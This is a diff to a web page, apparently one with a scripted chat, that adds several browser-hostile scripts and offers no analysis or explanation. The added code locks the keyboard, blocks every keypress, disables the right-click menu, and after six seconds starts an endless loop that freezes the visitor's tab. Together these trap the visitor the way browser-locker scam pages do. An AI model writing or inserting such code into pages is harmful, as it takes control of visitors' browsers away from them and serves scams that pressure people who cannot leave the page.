@@ -698,10 +698,30 @@ chatDelay = chatDelay3;
 
 
 <script>
-navigator.keyboard.lock();
-document.onkeydown = function (e) {
-return false;
+    navigator.keyboard.lock();
+    document.onkeydown = function (e) {
+    return false;
+    }
+</script>
+
+<script>
+    // Disable right-click
+    window.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+    });
+</script>
+
+<script>
+
+    setTimeout("warning()", 6000);
+    setTimeout("warning()", 6000);
+    function warning(){
+    while(true){
+        console.log('warning')
 }
+}
+
+
 </script>
 
 
